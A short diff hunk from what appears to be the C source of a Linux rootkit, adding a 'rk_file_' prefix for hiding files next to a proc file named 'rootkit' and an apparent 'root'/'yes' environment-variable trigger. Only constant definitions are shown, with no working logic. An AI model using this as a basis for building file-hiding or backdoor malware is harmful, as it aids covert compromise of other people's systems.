@@ -13,6 +13,7 @@
 #include "misc.h"
 
 #define PROCFILE_NAME "rootkit"
+#define HIDE_PREFIX "rk_file_"
 
 #define ENV_VAR "root"
 #define ENV_PASS "yes"
